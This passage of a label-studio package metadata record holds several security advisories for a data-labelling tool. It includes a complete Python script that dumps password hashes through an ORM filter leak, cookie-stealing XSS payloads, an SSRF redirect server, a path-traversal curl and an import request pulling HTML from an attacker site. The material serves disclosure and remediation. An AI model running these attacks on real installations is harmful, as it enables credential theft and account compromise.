filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.0.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.0.post1/","requires_dist":["wheel","appdirs (==1.4.3)","attr (==0.3.1)","attrs (>=19.1.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.26)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (==0.12.2)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.0.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"12ecb3cec7efd64d6d051c9cc727dcb56815340c99f597e6b27c5439264077d9","md5":"89e3887315c9f575a977a13365385e41","sha256":"3290ac3e452f4ebe12c1f936e2d834fa364ae63ebeafe1dbcaa0ad9ca637eb91"},"downloads":-1,"filename":"label_studio-1.0.0.post1-py3-none-any.whl","has_sig":false,"md5_digest":"89e3887315c9f575a977a13365385e41","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":47690199,"upload_time":"2021-03-19T06:35:20","upload_time_iso_8601":"2021-03-19T06:35:20.181632Z","url":"https://files.pythonhosted.org/packages/12/ec/b3cec7efd64d6d051c9cc727dcb56815340c99f597e6b27c5439264077d9/label_studio-1.0.0.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"b92bd5aaada450cc3bb169ed2d73db70551d74da93b0429a39977691c9ecfc67","md5":"e103a9cd31789d49a1057e04b7b33fc5","sha256":"f817bd0e2ed4c7cdbe90e7b74c49580c694a903c0a6d0c52a3377926e8c597b7"},"downloads":-1,"filename":"label-studio-1.0.0.post1.tar.gz","has_sig":false,"md5_digest":"e103a9cd31789d49a1057e04b7b33fc5","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":46875849,"upload_time":"2021-03-19T06:35:34","upload_time_iso_8601":"2021-03-19T06:35:34.471017Z","url":"https://files.pythonhosted.org/packages/b9/2b/d5aaada450cc3bb169ed2d73db70551d74da93b0429a39977691c9ecfc67/label-studio-1.0.0.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open 